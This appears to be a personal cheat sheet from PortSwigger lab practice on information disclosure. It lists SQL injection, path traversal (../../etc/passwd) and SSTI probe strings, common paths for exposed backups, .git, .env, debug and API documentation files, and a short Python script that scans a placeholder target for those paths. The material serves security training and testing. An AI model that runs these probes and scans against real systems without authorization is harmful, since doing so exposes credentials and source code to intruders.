# Information Disclosure - Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: Information disclosure in error messages
**Status**: SOLVED (Lab #33)
**Find**: Apache Struts version in error page
```
Apache Struts 2.3.31
```

### Lab 2: Info disclosure in backup files
**Status**: SOLVED (Lab #34)
**Find**: /backup containing database credentials

## Common Information Disclosure

### Error Messages
```
# Trigger errors to reveal info
' OR 1=1 --  (SQL error reveals DB type)
../../etc/passwd (path traversal)
{{7*7}} (SSTI)
```

### Backup Files
```
/backup
/backup.sql
/backup.zip
/database.sql
/db_backup.tar.gz
/.git
/.env
/config.php.bak
```

### Debug Endpoints
```
/debug
/debug/vars
/debug/pprof
/server-status
/server-info
/phpinfo.php
/info.php
/test.php
```

### API Documentation
```
/swagger-ui.html
/swagger/v1/swagger.json
/api-docs
/openapi.json
```

### Source Code
```
/.git/config
/.git/HEAD
/.svn/entries
/.DS_Store
/robots.txt
/sitemap.xml
```

### Server Headers
```
Server: Apache/2.4.41
X-Powered-By: PHP/7.4.3
```

## Detection Script
```python
import requests

paths = [
    "/robots.txt", "/sitemap.xml", "/.git/HEAD",
    "/backup", "/database.sql", "/.env",
    "/debug", "/phpinfo.php", "/server-status",
    "/swagger-ui.html", "/api-docs",
]

target = "https://TARGET"
for path in paths:
    r = requests.get(target + path)
    if r.status_code == 200 and len(r.text) > 100:
        print(f"[!] Found: {path} ({len(r.text)} bytes)")
```
